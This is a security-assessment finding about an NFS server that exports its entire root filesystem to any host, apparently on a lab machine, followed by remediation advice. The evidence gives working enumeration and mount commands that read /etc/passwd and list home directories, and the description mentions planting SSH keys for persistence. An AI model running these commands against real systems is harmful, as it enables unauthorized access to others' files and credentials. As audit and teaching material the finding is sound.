title: NFS Root Filesystem Export to All Hosts
description: The NFS service exports the entire root filesystem (/) to all hosts (*) with no access restrictions. Any host on the network can mount the full filesystem, read sensitive configuration files, and potentially write SSH keys for persistent access.
evidence:
Enumeration:
$ showmount -e 192.168.0.140
Export list for 192.168.0.140:
/ *

Exploitation:
$ sudo mount -t nfs -o nolock,vers=3 192.168.0.140:/ /tmp/nfs_mount
$ head -10 /tmp/nfs_mount/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
...

$ ls /tmp/nfs_mount/home/
ftp msfadmin service user

Full filesystem browseable including /etc/passwd, home directories, application configs.
remediation: Restrict NFS exports to specific trusted hosts/subnets. Never export the root filesystem. Use NFSv4 with Kerberos authentication. Apply the principle of least privilege to exported paths.
